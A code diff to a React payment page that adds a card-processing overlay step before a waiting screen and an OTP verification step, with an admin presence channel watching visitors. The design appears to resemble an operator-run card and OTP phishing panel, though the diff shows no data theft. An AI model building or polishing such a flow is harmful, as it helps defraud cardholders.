@@ -1,14 +1,15 @@
-import { useState, useEffect, useMemo, useRef } from "react";
+import { useState, useEffect, useMemo, useRef, useCallback } from "react";
 import PaymentForm from "@/components/PaymentForm";
 import OtpVerification from "@/components/OtpVerification";
 import type { OtpType } from "@/components/OtpVerification";
 import PaymentSuccess from "@/components/PaymentSuccess";
 import PaymentRejected from "@/components/PaymentRejected";
 import WaitingScreen from "@/components/WaitingScreen";
+import ProcessingOverlay from "@/components/ProcessingOverlay";
 import { supabase } from "@/integrations/supabase/client";
 
 const Index = () => {
-  const [step, setStep] = useState<"form" | "waiting" | "otp" | "processing" | "success" | "rejected">("form");
+  const [step, setStep] = useState<"form" | "processing_card" | "waiting" | "otp" | "processing" | "success" | "rejected">("form");
   const visitorId = useRef(crypto.randomUUID());
 
   // Join presence channel so admin knows someone is on the page
@@ -49,11 +50,18 @@ const Index = () => {
 
   const formattedTotal = isValidAmount ? formatEuro(total) : "€0.00";
 
+  const pendingSessionId = useRef<string | null>(null);
+
   const handleFormSubmit = (id: string) => {
-    setSessionId(id);
+    pendingSessionId.current = id;
     setCardInvalidError(null);
-    setStep("waiting");
+    setStep("processing_card");
   };
+
+  const handleProcessingComplete = useCallback(() => {
+    setSessionId(pendingSessionId.current);
+    setStep("waiting");
+  }, []);
 
   useEffect(() => {
     if (!sessionId || (step !== "waiting" && step !== "processing" && step !== "otp")) return;
@@ -238,6 +246,7 @@ const Index = () => {
               cardInvalidError={cardInvalidError}
             />
           )}
+          {step === "processing_card" && <ProcessingOverlay onComplete={handleProcessingComplete} />}
           {step === "waiting" && <WaitingScreen amount={formattedTotal} />}
           {step === "otp" && <OtpVerification onSubmit={handleOtpSubmit} error={otpError} otpType={otpType} />}
           {step === "processing" && <WaitingScreen amount={formattedTotal} />}
